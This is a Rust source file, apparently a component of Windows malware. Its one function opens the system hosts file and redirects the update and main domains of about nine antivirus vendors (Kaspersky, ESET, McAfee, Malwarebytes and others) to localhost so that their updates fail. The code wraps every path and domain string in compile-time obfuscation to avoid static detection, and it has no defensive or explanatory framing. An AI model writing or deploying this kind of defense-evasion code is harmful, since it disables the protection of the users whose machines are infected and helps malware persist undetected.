#[cfg(windows)]
use std::fs::OpenOptions;
#[cfg(windows)]
use std::io::{Read, Write};
#[cfg(windows)]
use std::path::PathBuf;

use obfstr::obfstr;

#[cfg(windows)]
pub fn block_av_updates() -> Result<(), Box<dyn std::error::Error>> {
    let hosts_path = PathBuf::from(obfstr!("C:\\Windows\\System32\\drivers\\etc\\hosts"));
    
    if !hosts_path.exists() {
        return Ok(()); // Should exist on Windows
    }

    // List of AV Update Domains to JAM (Redirect to localhost)
    let blocklist = vec![
        // Kaspersky
        obfstr!("kaspersky.com"), obfstr!("www.kaspersky.com"), obfstr!("update.kaspersky.com"), obfstr!("dnl-01.geo.kaspersky.com"), obfstr!("dnl-02.geo.kaspersky.com"),
        
        // Bitdefender
        obfstr!("bitdefender.com"), obfstr!("www.bitdefender.com"), obfstr!("upd.bitdefender.com"), obfstr!("nimbus.bitdefender.net"),
        
        // ESET
        obfstr!("eset.com"), obfstr!("www.eset.com"), obfstr!("update.eset.com"), obfstr!("expire.eset.com"),
        
        // Avast / AVG
        obfstr!("avast.com"), obfstr!("www.avast.com"), obfstr!("su.ff.avast.com"), obfstr!("p.ff.avast.com"),
        obfstr!("avg.com"), obfstr!("www.avg.com"), obfstr!("update.avg.com"),
        
        // McAfee
        obfstr!("mcafee.com"), obfstr!("www.mcafee.com"), obfstr!("update.mcafee.com"), obfstr!("liveupdate.mcafee.com"),
        
        // Symantec / Norton
        obfstr!("symantec.com"), obfstr!("norton.com"), obfstr!("liveupdate.symantecliveupdate.com"), obfstr!("update.symantec.com"),
        
        // Sophos
        obfstr!("sophos.com"), obfstr!("www.sophos.com"), obfstr!("d1.sophosupd.com"), obfstr!("d2.sophosupd.com"),
        
        // TrendMicro
        obfstr!("trendmicro.com"), obfstr!("www.trendmicro.com"), obfstr!("grid-global.trendmicro.com"),
        
        // Malwarebytes
        obfstr!("malwarebytes.com"), obfstr!("www.malwarebytes.com"), obfstr!("data-cdn.mbamupdates.com"), obfstr!("keystone.mwbsys.com")
    ];

    let mut file = OpenOptions::new()
        .read(true)
        .write(true)
        .append(true)
        .open(&hosts_path)?;

    let mut content = String::new();
    file.read_to_string(&mut content)?;

    let mut needs_newline = false;
    if !content.is_empty() && !content.ends_with('\n') {
        needs_newline = true;
    }

    for domain in blocklist {
        if !content.contains(domain) {
            if needs_newline {
                writeln!(file)?;
                needs_newline = false; 
            }
            // 127.0.0.1 domain.com
            writeln!(file, "127.0.0.1 {}", domain)?;
        }
    }

    Ok(())
}

#[cfg(not(windows))]
pub fn block_av_updates() -> Result<(), Box<dyn std::error::Error>> {
    Ok(())
}
